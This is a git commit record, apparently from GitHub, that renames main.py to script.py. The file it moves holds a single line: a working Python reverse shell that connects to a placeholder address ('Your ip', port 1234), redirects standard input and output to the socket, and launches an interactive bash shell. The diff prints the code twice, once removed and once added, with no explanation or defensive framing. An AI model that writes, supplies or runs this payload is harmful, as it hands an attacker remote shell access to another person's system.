5883c9179fc9a25bf654e0d7067cacf97217c721
z3r0 <134602585+z3ero0@users.noreply.github.com>
2023-06-11 13:13:40 -0400

    Rename main.py to script.py

--- main.py
+++
@@ -1,1 +0,0 @@
-import os,socket,subprocess;os.system('clear');s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('Your ip',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])
---
+++ script.py
@@ -0,0 +1,1 @@
+import os,socket,subprocess;os.system('clear');s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('Your ip',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])
